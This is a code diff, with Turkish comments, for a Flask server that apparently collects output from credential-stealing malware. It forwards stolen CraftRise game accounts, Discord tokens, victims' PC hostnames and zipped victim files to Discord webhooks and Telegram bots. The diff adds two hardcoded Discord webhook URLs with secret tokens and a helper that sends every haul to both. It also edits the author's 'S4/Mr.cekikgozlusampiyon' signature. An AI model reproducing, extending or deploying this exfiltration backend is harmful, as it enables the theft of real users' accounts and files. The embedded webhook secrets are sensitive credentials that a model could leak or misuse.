@@ -10,7 +10,9 @@ app = Flask(__name__)
 # ============================================================================
 # ENVIRONMENT VARIABLES
 # ============================================================================
-WEBHOOK = os.environ.get("WEBHOOK", "")
+WEBHOOK_1 = os.environ.get("WEBHOOK_1", "https://discord.com/api/webhooks/1535026449193504800/yDPbn6eJ5fkHImJwZOvvh6yXIE2SRjG0xFQrnWRHm9SSlIiG29gOYxrBG0ZfJ_xmDKne")
+WEBHOOK_2 = os.environ.get("WEBHOOK_2", "https://discord.com/api/webhooks/1533466775671275643/NQgAS7U3FVeV72aQgVmtIUna-pclYM_1IWrsmccExGLW-237G4ajNqufdz7g8wIzfvZF")
+
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
 
@@ -29,9 +31,9 @@ MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")
 # ============================================================================
 # LOGO URLS
 # ============================================================================
-LOGO_CRAFTRISE = "https://media.discordapp.net/attachments/1531817920907448421/1535036471222734941/crlogo.png?ex=6a764d9e&is=6a74fc1e&hm=6a025bc0a51658375ba63d297a82082e8b1ba023df81dab9ade24d052c207967&=&format=webp&quality=lossless"
-LOGO_DISCORD = "https://media.discordapp.net/attachments/1531817920907448421/1535036435420413962/discord.png?ex=6a764d95&is=6a74fc15&hm=78731d5637dbc0357394cdd71b663e8e3b052d0ad425b1823f25021175e739e0&=&format=webp&quality=lossless"
-LOGO_SIGN = "https://media.discordapp.net/attachments/1531817920907448421/1535048621937000498/JlTlE.jpg?ex=6a7658ef&is=6a75076f&hm=69ba75845e28c680fbe3074e564ad63b4d64a8a11a43cc2a175278e6e0f47a8f&=&format=webp"
+LOGO_CRAFTRISE = "https://media.discordapp.net/attachments/1531817920907448421/1535036471222734941/crlogo.png"
+LOGO_DISCORD = "https://media.discordapp.net/attachments/1531817920907448421/1535036435420413962/discord.png"
+LOGO_SIGN = "https://media.discordapp.net/attachments/1531817920907448421/1535048621937000498/JlTlE.jpg"
 
 # ============================================================================
 # TELEGRAM FUNCTIONS
@@ -78,6 +80,16 @@ def send_discord(url, data, files=None):
     except Exception as e:
         print(f"[-] Discord error: {e}")
 
+def send_to_both_webhooks(data, files=None):
+    """Her iki webhook'a da gönder"""
+    # Webhook 1
+    if WEBHOOK_1:
+        send_discord(WEBHOOK_1, data, files)
+    
+    # Webhook 2
+    if WEBHOOK_2:
+        send_discord(WEBHOOK_2, data, files)
+
 # ============================================================================
 # MAIN WEBHOOK
 # ============================================================================
@@ -122,7 +134,6 @@ def webhook():
                             account_info = field.get("value", "Unknown")
                             break
             
-            # Discord Webhook - CraftRise
             cr_embed = {
                 "embeds": [{
                     "title": "CraftRise",
@@ -130,14 +141,18 @@ def webhook():
                     "thumbnail": {"url": LOGO_CRAFTRISE},
                     "fields": [
                         {"name": "Account", "value": account_info, "inline": False},
-                        {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon - 31makinesii", "inline": False}
+                        {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon", "inline": False}
                     ],
                     "timestamp": datetime.utcnow().isoformat()
                 }]
             }
-            send_discord(CRAFTRISE_WEBHOOK, cr_embed)
             
-            # Telegram - CraftRise
+            # Her iki webhook'a da gönder
+            send_to_both_webhooks(cr_embed)
+            
+            if CRAFTRISE_WEBHOOK:
+                send_discord(CRAFTRISE_WEBHOOK, cr_embed)
+            
             send_telegram_msg(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, f"CraftRise\n{account_info}")
 
         # ============================================================
@@ -158,7 +173,6 @@ def webhook():
                                 token_count = int(match.group(1))
                             break
             
-            # Discord Webhook - Discord Tokens
             discord_embed = {
                 "embeds": [{
                     "title": "Discord",
@@ -167,14 +181,18 @@ def webhook():
                     "fields": [
                         {"name": "Status", "value": status_text, "inline": False},
                         {"name": "PC", "value": hostname, "inline": False},
-                        {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon - 31makinesii", "inline": False}
+                        {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon", "inline": False}
                     ],
                     "timestamp": datetime.utcnow().isoformat()
                 }]
             }
-            send_discord(DISCORD_WEBHOOK, discord_embed)
             
-            # Telegram - token'ları teker teker
+            # Her iki webhook'a da gönder
+            send_to_both_webhooks(discord_embed)
+            
+            if DISCORD_WEBHOOK:
+                send_discord(DISCORD_WEBHOOK, discord_embed)
+            
             tokens = data.get("tokens", [])
             if isinstance(tokens, str):
                 try:
@@ -190,7 +208,6 @@ def webhook():
         # MASTER (type: master veya boş)
         # ============================================================
         else:
-            # Embeds'e imza ve thumbnail ekle
             if embeds:
                 for embed in embeds:
                     if "fields" in embed:
@@ -202,29 +219,41 @@ def webhook():
                         if not has_signature:
                             embed["fields"].append({
                                 "name": "Signature",
-                                "value": "S4/Mr.cekikgozlusampiyon - 31makinesii",
+                                "value": "S4/Mr.cekikgozlusampiyon",
                                 "inline": False
                             })
                     if "footer" not in embed:
-                        embed["footer"] = {"text": "S4/Mr.cekikgozlusampiyon - 31makinesii"}
+                        embed["footer"] = {"text": "S4/Mr.cekikgozlusampiyon"}
                     if "thumbnail" not in embed:
                         embed["thumbnail"] = {"url": LOGO_SIGN}
             
             content = data.get("content", "")
             
-            # Master ve Webhook - embed + zip
             if file_bytes:
                 files = {'file': (f"{hostname}.zip", file_bytes)}
-                send_discord(MASTER_WEBHOOK, {'content': content}, files)
-                send_discord(WEBHOOK, {'content': content}, files)
                 
-                # Telegram - zip
+                # Her iki webhook'a da ZIP'li gönder
+                send_to_both_webhooks({'content': content}, files)
+                
+                if MASTER_WEBHOOK:
+                    send_discord(MASTER_WEBHOOK, {'content': content}, files)
+                if WEBHOOK_1:
+                    send_discord(WEBHOOK_1, {'content': content}, files)
+                if WEBHOOK_2:
+                    send_discord(WEBHOOK_2, {'content': content}, files)
+                
                 send_telegram_file(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip")
                 send_telegram_file(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip")
             else:
-                # Sadece embed
-                send_discord(MASTER_WEBHOOK, {"embeds": embeds})
-                send_discord(WEBHOOK, {"embeds": embeds})
+                # Her iki webhook'a da embed gönder
+                send_to_both_webhooks({"embeds": embeds})
+                
+                if MASTER_WEBHOOK:
+                    send_discord(MASTER_WEBHOOK, {"embeds": embeds})
+                if WEBHOOK_1:
+                    send_discord(WEBHOOK_1, {"embeds": embeds})
+                if WEBHOOK_2:
+                    send_discord(WEBHOOK_2, {"embeds": embeds})
 
         return jsonify({"status": "ok"}), 200
         
